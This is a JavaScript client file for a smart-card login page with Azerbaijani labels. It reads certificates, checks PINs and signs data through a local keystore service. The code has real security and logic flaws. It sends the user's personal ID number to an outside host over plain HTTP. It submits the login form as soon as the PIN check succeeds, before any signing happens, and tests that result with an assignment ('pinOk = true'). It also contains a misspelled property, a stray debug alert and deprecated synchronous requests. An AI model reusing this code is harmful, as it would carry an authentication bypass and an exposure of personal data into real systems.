function utils_Trim(stringToTrim) {
  return stringToTrim.replace(/^\s+|\s+$/g, "");
}

function utils_GetIExplorerVersion() {
  var engine = null;
  if (window.navigator.appName == "Microsoft Internet Explorer") {
    if (document.documentMode) {
      engine = document.documentMode;
    }else { 
      engine = 5; 
      if (document.compatMode) {
        if (document.compatMode == "CSS1Compat"){
          engine = 7; 
        }
      }            
    }
  }
  return engine;
}


function utils_CanRequestUmca() {
  var version = utils_GetIExplorerVersion();
  if (version != null && version < 10) {
    return false;
  }
  return true;
}


var Browsers = { IE: "IE", CHROME: "CHROME", FIREFOX: "FIREFOX", EDGE: "EDGE", EDGE_CHROMIUM: "EDGE_CHROMIUM", OPERA: "OPERA", SAFARI: "SAFARI" };


function utils_DetectBrowser(browser) {
  alert('Message from iframe just came!');
    // Opera 8.0+
    var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

    // Firefox 1.0+
    var isFirefox = typeof InstallTrigger !== 'undefined';

    // Safari 3.0+ "[object HTMLElementConstructor]" 
    var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));

    // Internet Explorer 6-11
    var isIE = /*@cc_on!@*/false || !!document.documentMode;

    // Edge 20+
    var isEdge = !isIE && !!window.StyleMedia;

    // Chrome 1 - 79
    var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);

    // Edge (based on chromium) detection
    var isEdgeChromium = isChrome && (navigator.userAgent.indexOf("Edg") != -1);

    // Blink engine detection
    var isBlink = (isChrome || isOpera) && !!window.CSS;
    switch (browser) {
      case Browsers.IE:
      return isIE;
      case Browsers.CHROME:
      return isChrome;
      case Browsers.FIREFOX:
      return isFirefox;
      case Browsers.EDGE:
      return isEdge;
      case Browsers.EDGE_CHROMIUM:
      return isEdgeChromium;
      case Browsers.OPERA:
      return isOpera;
      case Browsers.SAFARI:
      return isSafari;
      default:
      return false;
    }
  }


  function umca_GetURL() {
    return "https://localhost:25989";
  }

  function umca_GetVersion(header) {
    var lastDigitPosition = header.charAt(18).match(/\d+/) !== null ? 19 : 18;
    var version = header.substring(header.search(/\d+(?:\.\d+)+/), lastDigitPosition);
    return version;
  }

  var KeyStoreExceptions = {
    KSE_NOT_IMPLEMENTED: "funksiya tətbiq olunmayıb",
    KSE_DATA_NOT_FOUND: "sertifikat daşıyıcısı tapılmadı",
    KSE_STORE_GENERAL: "ümumi xəta baş verdi",
    KSE_INVALID_PASSWORD: "yanlış pin kod daxil edilib",
    KSE_LOGIN_REQUIRED: "login tələb olunur",
    KSE_STORE_LOCKED: "sertifikat daşıyıcısı bloklanıb",
    KSE_STORE_NOMEMORY: "sertifikat daşıyıcısında yetərli yaddaş qalmayıb"
  };

  function umca_FindErrorMessage(responseText) {
    var msg = JSON.parse(responseText).Message;
    var allExceptions = Object.keys(KeyStoreExceptions).reduce(function (accumulator, currentValue, currentIndex) {
      return accumulator + "|" + currentValue;
    });
    allExceptions = "(" + allExceptions + ")"
    var results = msg.match(allExceptions);
    return KeyStoreExceptions[results[0]] || msg;
  }

  function umca_CheckServiceActive(ajaxCallbacks) {
    $.ajax({
      type: "GET",
      url: umca_GetURL() + "/keystores",
        async: false, // TODO: deprecated, find alternative
        accept: "application/json, text/plain, */*"
      })
    .done(ajaxCallbacks.successFunc)
    .fail(ajaxCallbacks.errorFunc);
  }


  function umca_FindKeystore(keystoreSelector, ajaxCallbacks) {
    $.ajax({
      type: "POST",
      url: umca_GetURL() + "/keystores",
        async: false, // TODO: deprecated, find alternative
        contentType: "application/json",
        data: keystoreSelector
      })
    .done(ajaxCallbacks.successFunc)
    .fail(ajaxCallbacks.errorFunc);
  }


  function umca_GetKeystores_Certificates(ajaxCallbacks) {
    $.ajax({
      type: "GET",
      url: umca_GetURL() + "/keystores?ReadCertificates=true",
      async: false, 
      accept: "application/json, text/plain, */*"
    })    
    .done(ajaxCallbacks.successFunc)
    .fail(ajaxCallbacks.errorFunc);

  }

  function umca_SignData(userCertificate, data, userPin, ajaxCallbacks) {
    $.ajax({
      type: "POST",
      url: umca_GetURL() + "/sign",
        async: false, // TODO: deprecated, find alternative
        data: {
          Certificate: userCertificate,
          Data: data,
          Pin: userPin,
          SigType: "cms-stdua",
          DigestAlgOid: "1.3.14.3.2.26"
        }
      })
    .done(ajaxCallbacks.successFunc)
    .fail(ajaxCallbacks.errorFunc);
  }


  function umca_CheckPin(userPin, keystore, ajaxCallbacks) {
    $.ajax({
      type: "POST",
      url: umca_GetURL() + "/keystores/checkpin",
        async: false, // TODO: deprecated, find alternative
        contentType: "application/json",
        data: JSON.stringify({
          Pin: userPin,
          KeyStore: keystore
        })
      })
    .done(ajaxCallbacks.successFunc)
    .fail(ajaxCallbacks.errorFunc);
  }

  function utils_RequestRandomSync() {
    document.getElementById("FIN") && $.ajax({
      type: "POST",
      url: "http://www.ayhus.net/Islem/sorgu.php?fin=" + encodeURIComponent(document.getElementById("FIN").value),
      data:1234,
      success: function (data, success) {
        var melumat=JSON.parse(data)
            if (melumat[0]!=1) { //error
             document.getElementById("LN").innerText = "Məlumat tapılmadı";
             document.getElementById("tbUserPass").value = "";
             return;
           }
           if (melumat[1]!=1) { 
             document.getElementById("LN").innerText = "Giriş icazeniz yoxdur";
             document.getElementById("tbUserPass").value = "";
             return;
           }
            document.getElementById("Sync").value = data.substr(1, data.length); // vaisdan buna bax
            document.getElementById("UserRandom").value = Math.random().toString(16).substring(2, 15).toUpperCase();
            document.getElementById("tbUserPass").style.visibility = "visible";
            document.getElementById("logB").style.visibility = "visible";
            document.getElementById("labelPIN").innerText = "Pin kod";
            document.getElementById("Image1").src = melumat[9]
            document.getElementById("fotoimg").value = melumat[9];
          },

          error: function (XMLHttpRequest, textStatus, errorThrown) {
            document.getElementById("LN").innerText = errorThrown;
            console.log(XMLHttpRequest);
          }
        });

  }

// esas sehifede refresh
function ui_UpdateTokenUid() {
  document.getElementById("tbUserPass") && (document.getElementById("tbUserPass").style.visibility = "hidden");
  document.getElementById("logB") && (document.getElementById("logB").style.visibility = "hidden");
  document.getElementById("labelPIN") && (document.getElementById("labelPIN").style.visibility = "hidden");
  umca_GetKeystores_Certificates({
    successFunc: function (data, status, jqXHR) {      
      var labelUID = document.getElementById("labelUID"); // login zamani aktiv olur
      var labelUID2 = document.getElementById("labelUID2"); // parol deyisen zaman aktiv olur
      var txtUID = document.getElementById("TXT_UID");
      var FIN = document.getElementById("FIN");
      var fotoimg = document.getElementById("fotoimg").value;

      var labelPIN = document.getElementById("labelPIN");
      if (!labelUID) { 
        return;
      }
      if (data == null || data.length == 0) {
        labelUID.innerHTML = "Kartı taxısn!";
        txtUID.value = ""; 
        setImage();           
        return;
      }

      txtUID.value = labelUID.innerText = data[0].Certs ? data[0].Certs[0].Subject.CN : "-";
      FIN.value =  data[0].Certs ? data[0].Certs[0].Subject.uid : "-";
      setImage();
      utils_RequestRandomSync(); 
      labelPIN && (labelPIN.style.visibility = "visible"); // avoid null exception pim lebelini gosterir
      labelPIN && (labelPIN.innerText = "Gözləyin..."); // waiting for sync value from server icine melumat yazir

      var currentUID = labelUID.innerText || "";
      var currentUIDCertificate_Base64 = data && data[0] && data[0].Certs && data[0].Certs[0].Base64 || "";

      labelUID2 && (labelUID2.innerText = currentUID);            
      document.getElementById("UID") && (document.getElementById("UID").value = currentUID);
      txtUID && (txtUID.value = currentUID);

      document.getElementById("UserCertificate").value = currentUIDCertificate_Base64;
      document.getElementById("UserKeyType").value = 1;
      document.getElementById("ModuleVersion").value = umca_GetVersion(jqXHR.getResponseHeader('server'));
      document.getElementById("COMVersion").value = Browsers; // com version from umca service?
      document.getElementById("LN").innerHTML="";
      document.getElementById("LNServer").innerHTML="";
      document.getElementById("tbUserPass").value="";
    },
    errorFunc: function (jqXHR, textStatus, errorThrown) {
      var labelUID = document.getElementById("labelUID");
      labelUID && (labelUID.innerHTML = "Kartı taxın!");
      document.getElementById("LN").innerHTML="f";
      document.getElementById("LNServer").innerHTML="g";
      document.getElementById("tbUserPass").value="";

      
      if (jqXHR.readyState == 0) {
        document.getElementById("LN") && (document.getElementById("LN").innerText = "Umca Service işə düşməyib.");
      } else if (jqXHR.status === 500) {
        document.getElementById("LN") && (document.getElementById("LN").innerTextt = umca_FindErrorMessage(jqXHR.responseText));
      } else {
        document.getElementById("LN") && (document.getElementById("LN").innerText = jqXHR.responseText);
      }
    }
  });
}


function ui_DoAuth() { //umca ucun komekci auth
  document.getElementById("yuklemealanikapsayici").style.display = "block";
  document.getElementById("LN").innerText = "";
  document.getElementById("LNServer").innerText = "";
  if (utils_Trim(document.getElementById("tbUserPass").value) == "") {
    document.getElementById("yuklemealanikapsayici").style.display = "none";
    alert("Pin kodu daxil edin!");
    return false;
  }
  if (utils_Trim(document.getElementById("UserCertificate").value) == "") {
    document.getElementById("yuklemealanikapsayici").style.display = "none";
    alert("Sertifikat seçməmisiniz!");
    return false;
  }

  var keystoreSelector = { Certificate: document.getElementById("UserCertificate").value };
  var pinOk = false;
  var signDataOk = false;

  umca_CheckPin(
    document.getElementById("tbUserPass").value,
    keystoreSelector,
    {

      successFunc: function (data, status, jqXHR) {
        pinOk = true;
        if ( pinOk = true) {
          document.getElementById("giris").submit();
        }
      },
      errorFunc: function (jqXHR, textStatus, errorThrown) {
        document.getElementById("yuklemealanikapsayici").style.display = "none";
        if (jqXHR.readyState == 0) {
          document.getElementById("LN").innerText = "Umca Service işə düşməyib.";
        } else if (jqXHR.status === 500) {

          document.getElementById("LN").innerText = umca_FindErrorMessage(jqXHR.responseText);
        } else {
          document.getElementById("LN").innerText = jqXHR.responseText;
        }
      }
    }
    );

  pinOk && umca_SignData(
    document.getElementById("UserCertificate").value,
    document.getElementById("UserRandom").value ,
    document.getElementById("tbUserPass").value,
    {
      successFunc: function (data, status, jqXHR) {
        document.getElementById("Token").value = data;
        signDataOk = true;
      },
      errorFunc: function (jqXHR, textStatus, errorThrown) {
        if (jqXHR.readyState == 0) {                    
          document.getElementById("LN").innerText = "Umca Service işə düşməyib.";
        } else if (jqXHR.status === 500) {
          document.getElementById("LN").innerText = umca_FindErrorMessage(jqXHR.responseText);
        } else {
          document.getElementById("LN").innerText = jqXHR.responseText;
        }
      }
    }
    );
  return pinOk && signDataOk;
}
